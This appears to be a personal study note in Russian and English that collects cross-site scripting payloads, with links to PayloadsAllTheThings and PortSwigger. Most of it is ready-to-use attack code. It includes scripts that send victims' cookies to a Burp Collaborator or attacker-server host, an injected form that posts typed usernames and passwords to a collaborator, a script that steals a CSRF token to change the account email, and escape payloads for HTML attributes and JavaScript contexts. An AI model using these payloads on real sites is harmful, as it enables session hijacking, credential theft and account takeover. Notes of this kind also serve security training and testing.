***
[PayloadsAllTheThings/XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#cross-site-scripting)
***
# Навигация

> [[XSS#Exploiting cross-site scripting to steal cookies|1. Exploiting cross-site scripting to steal cookies]]
> [[XSS#XSS в HTML атрибутах|2. XSS в HTML атрибутах]]
> [[XSS### XSS into JavaScript|3. ## XSS into JavaScript]]
***
# Exploiting cross-site scripting to steal cookies

[PayloadsAllTheThings - XSS - data-grabber-for-xs](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss)
Пример в CORS: 
```
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```
или
```
<img src=x onerror=this.src="http://<my_server>:<port>/"+btoa(document.cookie)>
```
### Exploiting cross-site scripting to capture passwords
Здесь представлена форма, которая ожидает ввода логина и пароля, и сказу отправляет из в коллаборатор.
```
<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method:'POST', mode:'no-cors', body:username.value+':'+this.value });">
```
### Exploiting XSS to perform CSRF
**Пользователь**, зашедший на страницу с **xss**, направит запрос и свой **csrf токен** на смену **email** на **'/my-account/change-email'**, если **токен** висит в **html**.
```
<script>  
var req = new XMLHttpRequest();  
req.onload = handleResponse;  
req.open('get','/my-account',true);  
req.send();  
function handleResponse() {  
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  
var changeReq = new XMLHttpRequest();  
changeReq.open('post', '/my-account/change-email', true);  
changeReq.send('csrf='+token+'&email=test@test.com')  
};  
</script>
```

# XSS в HTML атрибутах

[portswigger.net/XSS/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
1. Через intruder проверить не заблокированные теги и атрибуты.
2. Если ввод попадает в href, можно использовать следующую конструкцию `javascript:alert(1)`. Выйдет следующее: 
`<a href="javascript:alert(document.domain)">`
3. Проверь атрибут `accesskey`. Пример: 
`https://web-site/?%27accesskey=%27x%27onclick=%27alert(1)`; где `%27` = `'`. 
Скрипт сработает при нажатии:
- On Windows: `ALT+SHIFT+X` / `ALT+X`
- On MacOS: `CTRL+ALT+X`
- On Linux: `Alt+X`
# XSS into JavaScript
Если ввод попадает в скрипт внутри HTML:
1. Попытаться закрыть тег предыдущего скрипта и открыть новый: `</script><img src=1 onerror=alert(document.domain)>`
2. Если ввод находится в литералах : \` \`, ' ', " ", стоит попытаться выйти из них:
	```
	'-alert(document.domain)-'
	';alert(document.domain)//
	```
	
	2.1. Если литералы экранируются, стоит проверить экранацию косой черты: \\ : ``\';alert(document.domain)//``
	2.2. Если косая черта экранируется, можно закодировать литерал, скорее всего в HTML кодировку: 
	`&apos;-alert(document.domain)-&apos;`
	2.3. Использовать конструкцию \${}: `${alert(document.domain)}`
1. Если запрещены круглые скобки, можно передавать аргументы в функции через конструкцию: `onerror=alert;throw 1`